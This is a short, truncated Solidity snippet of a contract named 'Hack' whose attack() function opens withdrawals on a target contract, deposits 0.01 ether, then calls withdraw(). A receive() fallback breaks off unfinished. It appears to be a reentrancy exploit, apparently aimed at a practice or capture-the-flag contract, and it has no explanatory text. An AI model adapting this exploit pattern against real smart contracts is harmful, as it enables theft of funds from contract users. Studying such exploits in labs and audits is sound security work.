...
contract Hack {
  ...
  function attack() payable public {
    address(target).call(abi.encodeWithSignature("openWithdraw()"));
    address(target).call{value: 0.01 ether}(abi.encodeWithSignature("deposite()"));
    address(target).call(abi.encodeWithSignature("withdraw()"));
  }
  receive() external payable {
